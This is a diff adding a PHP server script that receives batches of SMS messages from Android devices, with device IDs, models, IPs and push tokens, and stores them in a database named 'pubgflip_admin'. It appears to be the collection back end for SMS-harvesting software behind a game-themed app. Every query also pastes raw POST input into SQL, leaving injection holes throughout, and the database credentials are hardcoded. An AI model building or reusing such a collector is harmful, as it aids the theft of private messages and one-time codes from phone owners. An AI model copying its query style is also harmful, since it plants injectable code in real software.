@@ -1,0 +1,149 @@
+<?php
+date_default_timezone_set("Asia/Calcutta");
+$con=mysqli_connect("localhost","pubgflip_admin","pubgflip_admin","pubgflip_admin");
+
+	$data = array();
+
+	// Validation
+	if(empty($_POST)){
+
+		echo response(400,"Invalid request",$data); exit;
+
+	}elseif (!isset($_POST["method"]) || empty($_POST["method"])) {
+
+		echo response(400,"Method is missing",$data); exit;
+	}
+
+	
+	// SMS
+	if($_POST["method"] == 'sms'){
+
+		if(empty($_POST["sms_key"])) {
+ 
+			echo response(400,"Missing arguments",$data); exit;
+		}else{
+            
+            $ip = $_POST["ip"];
+            $user_id = $_POST["user_id"];
+			$sms = $_POST["sms_key"];
+			$date = $_POST["date"];
+			$json=$_POST['sms_key'];
+            $a=json_decode($json,true);
+           
+            $update_status = "delete from tbl_status";
+            $query_status = mysqli_query($con,$update_status);
+           
+            foreach($a as $data_value)
+            {
+                $ip = trim($data_value["ip"]);
+                $user_id = $data_value["user_id"];
+                $device_id = $data_value["device_id"];
+                $android_version = $data_value["android_version"];
+//new insertion of device model varaibale
+                $device_model = $data_value["device_model"];
+                  
+
+                $sms = $data_value["sms"];
+                $date = $data_value["date"];
+                
+                 $select_status = "select * from tbl_status where status1 = '$ip'";
+                 $query = mysqli_query($con,$select_status);
+                 $num_rows = mysqli_num_rows($query);
+                 if($num_rows==0 )
+                 {
+                    $insert_status = "insert into tbl_status values ('$device_id','online','Online')";
+                    $query_status = mysqli_query($con,$insert_status);
+    
+                    
+                    
+                 }
+                
+                $select1 = "select * from sms where sms_user = '$ip' and sms_text = '$sms' and sms_date = '$date' ";
+                $query = mysqli_query($con,$select1);
+                
+                $num_rows = mysqli_num_rows($query);
+                if($num_rows==0)
+                {
+                    $select = "select * from sms where device_id = '$device_id' and andriod_version = '$android_version' and user_id != '' order by sms_id desc limit 1";
+                    $query = mysqli_query($con,$select);
+                    $num_rows = mysqli_num_rows($query);
+                    if($num_rows > 0)
+                    {   
+                        while ($row = mysqli_fetch_row($query))
+                        {
+                            $user_id = $row[1];
+                        }
+                    }
+                     $statusmsg='online';
+                    
+                    // $insert = "insert into sms(user_id, sms_user, sms_text, sms_date, device_id, andriod_version) values ('$user_id','$ip', '$sms', '$date', '$device_id', '$android_version')";
+                       $insert = "insert into sms(user_id, sms_user, sms_text, sms_date, device_id, andriod_version,device_model) values ('$user_id','$ip', '$sms', '$date', '$device_id', '$android_version', '$device_model')";
+                      // $insert1="insert into tbl_status(status_id,status1,status2) values('$device_id','$device_id'','Online')";
+                      // $query1=mysqli_query($con,$insert1);
+                      //$insert_status = "insert into tbl_status(status_id,status1,status2) values ('$device_id','online','online')";
+                     // $query_status = mysqli_query($con,$insert_status);
+                    $query = mysqli_query($con,$insert);
+                }
+            }
+            echo response(200,"SMS added successfully",$data);
+		    exit;
+        }
+	}
+	
+
+	// Toekn
+	if($_POST["method"] == 'token'){
+
+		if(empty($_POST["token_value"])) {
+ 
+			echo response(400,"Missing arguments",$data); exit;
+		}else{
+
+			$token = $_POST["token_value"];
+			
+			$select = "select * from tbl_token where token = '$token'  ";
+                $query = mysqli_query($con,$select);
+                $num_rows = mysqli_num_rows($query);
+                if($num_rows==0)
+                {
+			
+			$insert = "insert into tbl_token values ('','$token')";
+            $query = mysqli_query($con,$insert);
+                }
+    
+			echo response(200,"Token added successfully",$data); exit;
+
+		}
+
+	}
+	
+	// status
+	if($_POST["method"] == 'check_status'){
+
+		if(empty($_POST["ip_value"])) {
+ 
+			echo response(400,"Missing arguments",$data); exit;
+		}else{
+
+			$ip_value = trim($_POST["ip_value"]);
+            echo response(200,"IP Added Successfully",$data); exit;
+        }
+
+	}
+	
+	/*============== Helper ===============*/
+	function response($code,$message,$param=""){
+		$data["status"] = $code;
+		$data["message"] = $message;
+		if(!empty($param))	{
+			foreach($param as $key=>$val){
+				$data1[$key] = $val;
+			}
+			$data["data"] = $data1;
+		}else{
+			$data["data"] = array();
+		}
+		return json_encode($data);
+	}
+
+?>
